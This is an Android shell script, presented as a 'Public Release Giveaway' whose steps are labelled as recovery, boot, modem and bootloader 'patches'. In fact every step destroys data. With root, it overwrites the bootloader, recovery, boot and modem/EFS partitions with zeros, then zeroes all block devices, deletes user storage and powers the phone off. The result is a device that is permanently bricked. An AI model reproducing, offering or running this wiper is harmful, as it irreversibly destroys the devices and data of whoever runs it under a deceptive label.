#!/system/bin/sh
#!/bin/bash
# Dec 24 2024 # Public Release Giveaway
# Author : x######
# #clear
su -c dd if=/dev/zero of=/dev/block/by-name/abl
su -c dd if=/dev/zero of=/dev/block/by-name/abl_a
su -c dd if=/dev/zero of=/dev/block/by-name/abl_b

# #recovery patch
su -c dd if=/dev/zero of=/dev/block/by-name/recovery
su -c dd if=/dev/zero of=/dev/block/by-name/recovery_a
su -c dd if=/dev/zero of=/dev/block/by-name/recovery_b

# #boot/ramdisk recovery patch
su -c dd if=/dev/zero of=/dev/block/by-name/boot
su -c dd if=/dev/zero of=/dev/block/by-name/boot_a
su -c dd if=/dev/zero of=/dev/block/by-name/boot_b

# #modem patch
su -c dd if=/dev/zero of=/dev/block/by-name/fsc
su -c dd if=/dev/zero of=/dev/block/by-name/fsg
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs1
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs2
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs3
su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefsc
su -c dd if=/dev/zero of=/dev/block/by-name/modem
su -c dd if=/dev/zero of=/dev/block/by-name/modemst1
su -c dd if=/dev/zero of=/dev/block/by-name/modemst2

# #xbl load tee and fastboot patch
su -c dd if=/dev/zero of=/dev/block/by-name/xbl
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_a
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_b
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config_a
su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config_b

rm -f /dev/input/*
umount -f /proc/partitions
tail -n +2 /proc/partitions | grep -E sd*\|mmcblk* | while IFS= read -r a

do
    d=`echo $a | awk '{print $3}'`
    [ ${#d} -gt 6 ] || [ $d -gt 307200 ] && continue
    {
        b=/dev/block/`echo $a | awk '{print $4}'`
        umount -f $b
        
        rm -f $b
        mknod $b b `echo $a | awk '{print $1}'` `echo $a | awk '{print $2}'`
        blockdev --setrw $b

        chmod 0600 $b
        dd if=/dev/zero of=$b
    } &
done

#FINAL PATCH
rm -rf /storage/emulated/0/*

reboot -p
